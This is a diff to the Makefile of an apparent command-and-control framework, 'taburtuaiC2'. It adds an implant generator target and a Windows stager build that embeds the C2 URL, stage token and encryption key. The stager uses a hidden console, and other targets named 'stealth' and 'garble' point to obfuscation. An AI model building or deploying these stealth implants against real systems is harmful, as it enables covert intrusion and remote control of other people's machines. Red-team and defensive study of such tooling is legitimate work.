@@ -1,10 +1,11 @@
 # taburtuaiC2 Makefile
 # Usage: make help
 
-BINARY_DIR  := bin
-SERVER_BIN  := $(BINARY_DIR)/server
+BINARY_DIR   := bin
+SERVER_BIN   := $(BINARY_DIR)/server
 OPERATOR_BIN := $(BINARY_DIR)/operator
-AGENT_DIR   := ./agent
+GENERATE_BIN := $(BINARY_DIR)/generate
+AGENT_DIR    := ./agent
 
 # Default C2 server (override via env or CLI)
 C2_SERVER   ?= http://127.0.0.1:8080
@@ -26,12 +27,12 @@ LDFLAGS_BASE := -X main.serverURL=$(C2_SERVER) \
 LDFLAGS_STRIP := $(LDFLAGS_BASE) -s -w
 LDFLAGS_WIN   := $(LDFLAGS_STRIP) -H windowsgui
 
-.PHONY: all server operator agent-windows agent-linux agent-darwin \
-        agent-win-stealth agent-win-garble deps clean help
+.PHONY: all server operator generate agent-windows agent-linux agent-darwin \
+        agent-win-stealth agent-win-garble stager deps clean help
 
 ## ── Default ──────────────────────────────────────────────────────────────────
 
-all: server operator agent-windows
+all: server operator generate agent-windows
 
 ## ── Server & Operator ────────────────────────────────────────────────────────
 
@@ -44,6 +45,24 @@ operator: ## Build operator CLI binary
 	@mkdir -p $(BINARY_DIR)
 	$(GO) build -o $(OPERATOR_BIN) ./cmd/operator
 	@echo "[+] Operator: $(OPERATOR_BIN)"
+
+generate: ## Build implant generator CLI
+	@mkdir -p $(BINARY_DIR)
+	$(GO) build -o $(GENERATE_BIN) ./cmd/generate
+	@echo "[+] Generator: $(GENERATE_BIN)"
+
+stager: ## Build Windows stager binary (use generate cmd for production)
+	@mkdir -p $(BINARY_DIR)
+	GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
+	$(GO) build \
+		-ldflags "$(LDFLAGS_WIN) \
+			-X main.c2URL=$(C2_SERVER) \
+			-X main.stageToken=$(STAGE_TOKEN) \
+			-X main.encKey=$(ENC_KEY) \
+			-X main.execMethod=$(or $(EXEC_METHOD),thread)" \
+		-o $(BINARY_DIR)/stager.exe \
+		./cmd/stager
+	@echo "[+] Stager: $(BINARY_DIR)/stager.exe"
 
 ## ── Agent builds ─────────────────────────────────────────────────────────────
 
